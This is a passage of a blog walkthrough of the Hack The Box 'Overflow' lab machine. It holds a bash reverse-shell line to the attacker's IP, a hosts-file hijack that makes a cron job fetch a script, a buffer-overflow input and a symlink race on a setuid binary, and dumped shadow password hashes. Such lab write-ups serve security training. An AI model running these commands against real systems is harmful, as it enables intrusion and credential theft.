+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.23/9001 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>Now, start a python webserver at port 80.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/overflow]</span><br><span class="line">└─<span class="comment"># python2 -m SimpleHTTPServer 80                                                                                                  </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.11.119 - - [11/Mar/2022 10:20:02] <span class="string">&quot;GET /task.sh HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<p>Setup a netcat listener on port 9001.</p>
+<p>Now, in developer’s session, do the following:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;10.10.14.23  taskmanage.overflow.htb&#x27;</span> &gt; /etc/hosts</span><br><span class="line">$ <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">10.10.14.23  taskmanage.overflow.htb</span><br></pre></td></tr></table></figure>
+
+<p>On your listener, you will get a shell as the tester user.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/overflow]</span><br><span class="line">└─<span class="comment"># nc -lvp 9001                                     </span></span><br><span class="line">Ncat: Version 7.92 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.11.119.</span><br><span class="line">Ncat: Connection from 10.10.11.119:59148.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (4627): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">tester@overflow:~$ <span class="built_in">id</span> </span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(tester) gid=1000(tester) <span class="built_in">groups</span>=1000(tester)</span><br><span class="line">tester@overflow:~$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">tester</span><br><span class="line">tester@overflow:~$ python3 -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">python3 -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">tester@overflow:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">tester@overflow:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">06152183bf4ab9054492be6b13a0a3ff</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2173.jpg"></li>
+</ul>
+<h1 id="tester-gt-root-user"><a href="#tester-gt-root-user" class="headerlink" title="tester -&gt; root user"></a>tester -&gt; root user</h1><p>To get root in this machine, you will need an extra terminal as the tester user. Please follow the above steps for that.</p>
+<p>On one terminal, go to &#x2F;opt&#x2F;file_encrypt and you will find an elf binary named file_encrypt.</p>
+<p>Also, create a file in tester home directory like below:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tester@overflow:/opt/file_encrypt$ file file_encrypt</span><br><span class="line">file file_encrypt</span><br><span class="line">file_encrypt: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=3ae0f5750a8f1ac38945f813b5e34ddc166daf57, not stripped</span><br><span class="line">tester@overflow:~$ <span class="built_in">echo</span> <span class="string">&quot;luci&quot;</span> &gt; luci</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;luci&quot;</span> &gt; luci</span><br><span class="line">tester@overflow:~$ <span class="built_in">cat</span> luci</span><br><span class="line"><span class="built_in">cat</span> luci</span><br><span class="line">luci</span><br></pre></td></tr></table></figure>
+
+<p>Execute the binary, you will be asked to enter a pin:</p>
+<p>Pin is -202976456</p>
+<p>Put this pin and you will asked to enter name:</p>
+<p>In name, enter this: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV</p>
+<p>Then, you will be asked to enter input file:</p>
+<p>Enter the file which you created in the tester home directory.</p>
+<p>Enter Input File: &#x2F;home&#x2F;tester&#x2F;luci</p>
+<p>You will be prompted to enter the encrypted file. Now you have to be very fast on it.</p>
+<p>On other terminal, go to tester home directory and put this command but don’t execute it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> luci; <span class="built_in">ln</span> -s /root/root.txt luci</span><br></pre></td></tr></table></figure>
+
+<p>Now after entering the encrypted file, go to the other terminal and execute the above command. You have to be very fast on it. Because you get at least 3 seconds.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tester@overflow:~$ /opt/file_encrypt/file_encrypt</span><br><span class="line">/opt/file_encrypt/file_encrypt</span><br><span class="line">This is the code 1804289383. Enter the Pin: -202976456</span><br><span class="line">-202976456</span><br><span class="line">name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV</span><br><span class="line">Thanks <span class="keyword">for</span> checking. You can give your feedback <span class="keyword">for</span> improvements at developer@overflow.htb</span><br><span class="line">Enter Input File: /home/tester/luci</span><br><span class="line">/home/tester/luci</span><br><span class="line">Enter Encrypted File: /home/tester/out </span><br><span class="line">/home/tester/out</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvp 9001                                     </span></span><br><span class="line">Ncat: Version 7.92 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.11.119.</span><br><span class="line">Ncat: Connection from 10.10.11.119:59372.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (4863): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">tester@overflow:~$ python3 -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">python3 -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">tester@overflow:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">luci  user.txt</span><br><span class="line">tester@overflow:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">luci  user.txt</span><br><span class="line">tester@overflow:~$ <span class="built_in">rm</span> luci; <span class="built_in">ln</span> -s /root/root.txt luci</span><br><span class="line"><span class="built_in">rm</span> luci; <span class="built_in">ln</span> -s /root/root.txt luci</span><br><span class="line">tester@overflow:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">luci  out  user.txt</span><br><span class="line">tester@overflow:~$ <span class="built_in">cat</span> out</span><br><span class="line"><span class="built_in">cat</span> out</span><br><span class="line">���������������������������������</span><br><span class="line">tester@overflow:~$ xxd -p out</span><br><span class="line">xxd -p out</span><br><span class="line">fff8aaa8aaadaea8a3a3aeffaefeaca8aaa3f9f8adfafda8fdfdf8a8a2a8aaab91</span><br></pre></td></tr></table></figure>
+
+<p>Copy this and go to <span class="exturl" data-url="aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv">https://gchq.github.io/CyberChef/<i class="fa fa-external-link-alt"></i></span></p>
+<p>Follow the steps and you will get the root.txt!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/<span class="comment">#recipe=From_Hex(&#x27;Auto&#x27;)XOR(%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;0x9b&#x27;%7D,&#x27;Standard&#x27;,false)&amp;input=ZmZmOGFhYThhYWFkYWVhOGEzYTNhZWZmYWVmZWFjYThhYWEzZjlmOGFkZmFmZGE4ZmRmZGY4YThhMmE4YWFhYjkx</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2174.jpg"></li>
+</ul>
+<p>get the root hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tester@overflow:~$ xxd -p out</span><br><span class="line">xxd -p out</span><br><span class="line">e9f4f4efa1bfadbffae2fcdaceb5f5ffbff8decfcfa2edfaeee2abd9cdf1efc3dfacccc1cae1f1f5fea3d0e1eecbdddac3f6fcccf4ded9dfd5aef8f8b4f7ecd1a9d1edecf5eac1cfcec2efe2f8aafde3edc3edcec9d9acf2dfdae1f9fcece9b5fcf3cbade9e3b4a1aaa3acaca3a1aba1a2a2a2a2a2a1aca1a1a191fffafef6f4f5a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f9f2f5a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191e8e2e8a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191e8e2f5f8a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191fcfaf6fee8a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f6faf5a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f7eba1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f6faf2f7a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f5feece8a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191eeeef8eba1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191ebe9f4e3e2a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191ecececb6fffaeffaa1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f9faf8f0eeeba1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f7f2e8efa1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f2e9f8a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191fcf5faefe8a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f5f4f9f4ffe2a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191e8e2e8effef6ffb6f5feefecf4e9f0a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191e8e2e8effef6ffb6e9fee8f4f7edfea1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191e8e2e8f7f4fca1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f6fee8e8fafcfef9eee8a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191c4faebefa1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f7e3ffa1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191eeeef2ffffa1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191fff5e8f6fae8eaa1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f7faf5ffe8f8faebfea1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191ebf4f7f7f2f5faeffea1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191effee8effee9a1bfadbfe3d0b5d8eda9fdf5bfddc8add9cdecd5dcd2fcd7e3d6a2d7d0fec1cdcdd8cbdee3e8c3eed0deafcdefebd6cac8b4e3ffd4eec9d3dec9f1cdedddcaa8fce8f1feb5aedfafcdc1a9c2d6f3dac2dfeee2d6d7c3e3ddebe1caabf3e8aeaecff7b4a1aaa3acaca3a1aba1a2a2a2a2a2a1aca1a1a191ebf4e8effdf2e3a1b1a1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191f6e2e8eaf7a1baa1aaa3acadafa1aba1a2a2a2a2a2a1aca1a1a191fffeedfef7f4ebfee9a1bfadbfcdfce1d9d5f3efcabfdfa2b5ecfed8ccecd2f5fef0e3efd2a2cafad6f4fdf7d3f4f9f2edd8e8d9f2c1c2fdd1b4acf4dcefedc2aeafc9c2dcb5d2f1efabf1dcf0dacfafabeacad5d0b4f0c9a9a3c1cdefcec3afced0a9d0f7eaddeff6f4acaba1aaa3acaca8a1aba1a2a2a2a2a2a1aca1a1a191e8e8f3ffa1b1a1aaa3acaca3a1aba1a2a2a2a2a2a1aca1a1a191</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/<span class="comment">#recipe=From_Hex(&#x27;Auto&#x27;)XOR(%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;0x9b&#x27;%7D,&#x27;Standard&#x27;,false)&amp;input=ZTlmNGY0ZWZhMWJmYWRiZmZhZTJmY2RhY2ViNWY1ZmZiZmY4ZGVjZmNmYTJlZGZhZWVlMmFiZDljZGYxZWZjM2RmYWNjY2MxY2FlMWYxZjVmZWEzZDBlMWVlY2JkZGRhYzNmNmZjY2NmNGRlZDlkZmQ1YWVmOGY4YjRmN2VjZDFhOWQxZWRlY2Y1ZWFjMWNmY2VjMmVmZTJmOGFhZmRlM2VkYzNlZGNlYzlkOWFjZjJkZmRhZTFmOWZjZWNlOWI1ZmNmM2NiYWRlOWUzYjRhMWFhYTNhY2FjYTNhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZmZmYWZlZjZmNGY1YTFiMWExYWFhM2FjYWRhZmExYWJhMWEyYTJhMmEyYTJhMWFjYTFhMWExOTFmOWYyZjVhMWIxYTFhYWEzYWNhZGFmYTFhYmExYTJhMmEyYTJhMmExYWNhMWExYTE5MWU4ZTJlOGExYjFhMWFhYTNhY2FkYWZhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZThlMmY1ZjhhMWIxYTFhYWEzYWNhZGFmYTFhYmExYTJhMmEyYTJhMmExYWNhMWExYTE5MWZjZmFmNmZlZThhMWIxYTFhYWEzYWNhZGFmYTFhYmExYTJhMmEyYTJhMmExYWNhMWExYTE5MWY2ZmFmNWExYjFhMWFhYTNhY2FkYWZhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZjdlYmExYjFhMWFhYTNhY2FkYWZhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZjZmYWYyZjdhMWIxYTFhYWEzYWNhZGFmYTFhYmExYTJhMmEyYTJhMmExYWNhMWExYTE5MWY1ZmVlY2U4YTFiMWExYWFhM2FjYWRhZmExYWJhMWEyYTJhMmEyYTJhMWFjYTFhMWExOTFlZWVlZjhlYmExYjFhMWFhYTNhY2FkYWZhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZWJlOWY0ZTNlMmExYjFhMWFhYTNhY2FkYWZhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZWNlY2VjYjZmZmZhZWZmYWExYjFhMWFhYTNhY2FkYWZhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZjlmYWY4ZjBlZWViYTFiMWExYWFhM2FjYWRhZmExYWJhMWEyYTJhMmEyYTJhMWFjYTFhMWExOTFmN2YyZThlZmExYjFhMWFhYTNhY2FkYWZhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZjJlOWY4YTFiMWExYWFhM2FjYWRhZmExYWJhMWEyYTJhMmEyYTJhMWFjYTFhMWExOTFmY2Y1ZmFlZmU4YTFiMWExYWFhM2FjYWRhZmExYWJhMWEyYTJhMmEyYTJhMWFjYTFhMWExOTFmNWY0ZjlmNGZmZTJhMWIxYTFhYWEzYWNhZGFmYTFhYmExYTJhMmEyYTJhMmExYWNhMWExYTE5MWU4ZTJlOGVmZmVmNmZmYjZmNWZlZWZlY2Y0ZTlmMGExYjFhMWFhYTNhY2FkYWZhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZThlMmU4ZWZmZWY2ZmZiNmU5ZmVlOGY0ZjdlZGZlYTFiMWExYWFhM2FjYWRhZmExYWJhMWEyYTJhMmEyYTJhMWFjYTFhMWExOTFlOGUyZThmN2Y0ZmNhMWIxYTFhYWEzYWNhZGFmYTFhYmExYTJhMmEyYTJhMmExYWNhMWExYTE5MWY2ZmVlOGU4ZmFmY2ZlZjllZWU4YTFiMWExYWFhM2FjYWRhZmExYWJhMWEyYTJhMmEyYTJhMWFjYTFhMWExOTFjNGZhZWJlZmExYjFhMWFhYTNhY2FkYWZhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZjdlM2ZmYTFiMWExYWFhM2FjYWRhZmExYWJhMWEyYTJhMmEyYTJhMWFjYTFhMWExOTFlZWVlZjJmZmZmYTFiMWExYWFhM2FjYWRhZmExYWJhMWEyYTJhMmEyYTJhMWFjYTFhMWExOTFmZmY1ZThmNmZhZThlYWExYjFhMWFhYTNhY2FkYWZhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZjdmYWY1ZmZlOGY4ZmFlYmZlYTFiMWExYWFhM2FjYWRhZmExYWJhMWEyYTJhMmEyYTJhMWFjYTFhMWExOTFlYmY0ZjdmN2YyZjVmYWVmZmVhMWIxYTFhYWEzYWNhZGFmYTFhYmExYTJhMmEyYTJhMmExYWNhMWExYTE5MWVmZmVlOGVmZmVlOWExYmZhZGJmZTNkMGI1ZDhlZGE5ZmRmNWJmZGRjOGFkZDljZGVjZDVkY2QyZmNkN2UzZDZhMmQ3ZDBmZWMxY2RjZGQ4Y2JkZWUzZThjM2VlZDBkZWFmY2RlZmViZDZjYWM4YjRlM2ZmZDRlZWM5ZDNkZWM5ZjFjZGVkZGRjYWE4ZmNlOGYxZmViNWFlZGZhZmNkYzFhOWMyZDZmM2RhYzJkZmVlZTJkNmQ3YzNlM2RkZWJlMWNhYWJmM2U4YWVhZWNmZjdiNGExYWFhM2FjYWNhM2ExYWJhMWEyYTJhMmEyYTJhMWFjYTFhMWExOTFlYmY0ZThlZmZkZjJlM2ExYjFhMWFhYTNhY2FkYWZhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZjZlMmU4ZWFmN2ExYmFhMWFhYTNhY2FkYWZhMWFiYTFhMmEyYTJhMmEyYTFhY2ExYTFhMTkxZmZmZWVkZmVmN2Y0ZWJmZWU5YTFiZmFkYmZjZGZjZTFkOWQ1ZjNlZmNhYmZkZmEyYjVlY2ZlZDhjY2VjZDJmNWZlZjBlM2VmZDJhMmNhZmFkNmY0ZmRmN2QzZjRmOWYyZWRkOGU4ZDlmMmMxYzJmZGQxYjRhY2Y0ZGNlZmVkYzJhZWFmYzljMmRjYjVkMmYxZWZhYmYxZGNmMGRhY2ZhZmFiZWFjYWQ1ZDBiNGYwYzlhOWEzYzFjZGVmY2VjM2FmY2VkMGE5ZDBmN2VhZGRlZmY2ZjRhY2FiYTFhYWEzYWNhY2E4YTFhYmExYTJhMmEyYTJhMmExYWNhMWExYTE5MWU4ZThmM2ZmYTFiMWExYWFhM2FjYWNhM2ExYWJhMWEyYTJhMmEyYTJhMWFjYTFhMWExOTE</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root:$6<span class="variable">$aygAU</span>.nd<span class="variable">$cETT9vauy0BVjtXD7WZQzjne8KzuPFAXmgWoEBDN5cc</span>/lwJ2JvwnqZTUYtyc1fxvXvURB7iDAzbgwr.ghP6rx/:18778:0:99999:7:::</span><br><span class="line">daemon:*:18764:0:99999:7:::</span><br><span class="line">bin:*:18764:0:99999:7:::</span><br><span class="line">sys:*:18764:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:18764:0:99999:7:::</span><br><span class="line">games:*:18764:0:99999:7:::</span><br><span class="line">man:*:18764:0:99999:7:::</span><br><span class="line">lp:*:18764:0:99999:7:::</span><br><span class="line">mail:*:18764:0:99999:7:::</span><br><span class="line">news:*:18764:0:99999:7:::</span><br><span class="line">uucp:*:18764:0:99999:7:::</span><br><span class="line">proxy:*:18764:0:99999:7:::</span><br><span class="line">www-data:*:18764:0:99999:7:::</span><br><span class="line">backup:*:18764:0:99999:7:::</span><br><span class="line">list:*:18764:0:99999:7:::</span><br><span class="line">irc:*:18764:0:99999:7:::</span><br><span class="line">gnats:*:18764:0:99999:7:::</span><br><span class="line">nobody:*:18764:0:99999:7:::</span><br><span class="line">systemd-network:*:18764:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18764:0:99999:7:::</span><br><span class="line">syslog:*:18764:0:99999:7:::</span><br><span class="line">messagebus:*:18764:0:99999:7:::</span><br><span class="line">_apt:*:18764:0:99999:7:::</span><br><span class="line">lxd:*:18764:0:99999:7:::</span><br><span class="line">uuidd:*:18764:0:99999:7:::</span><br><span class="line">dnsmasq:*:18764:0:99999:7:::</span><br><span class="line">landscape:*:18764:0:99999:7:::</span><br><span class="line">pollinate:*:18764:0:99999:7:::</span><br><span class="line">tester:$6<span class="variable">$xK</span>.Cv2fn<span class="variable">$FS6BVwNGIgLxM9LKeZVVCPExsXuKE4VtpMQS</span>/xdOuRHERjVvFQ3gsje.5D4VZ2YMhAYDuyMLXxFpzQ0hs55Tl/:18778:0:99999:7:::</span><br><span class="line">postfix:*:18764:0:99999:7:::</span><br><span class="line">mysql:!:18764:0:99999:7:::</span><br><span class="line">developer:$6$VgzBNhtQ<span class="variable">$D9</span>.weCWwInekxtI9QaMoflHobivCsBiZYfJ/7oGtvY54RYG.Ijt0jGkAT40qQNK/kR28ZVtUX4UK2KlqFtmo70:18773:0:99999:7:::</span><br><span class="line">sshd:*:18778:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2175.jpg"></li>
+</ul>
+<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
+<li>oracle padding attack to get admin’s cookie</li>
+<li>sqli injection to get devbuild-job.overflow.htb subdomain</li>
+<li>CVE-2021-22204 exiftool RCE to get reverse shell</li>
+<li>mysql password reuse by developer ssh</li>
+<li>use bash cron job to get to tester user</li>
+<li>file_encrypt bin reverse then using cyberchef to get root flag and root’s shadow hash</li>
+</ul>
+<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2022/03/11/overflow/" title="Hack-The-Box-walkthrough[overflow]">https://fdlucifer.github.io/2022/03/11/overflow/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/03/02/routerspace/" rel="prev" title="Hack-The-Box-walkthrough[routerspace]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[routerspace]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/03/23/catch/" rel="next" title="Hack-The-Box-walkthrough[catch]">
+                  Hack-The-Box-walkthrough[catch] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
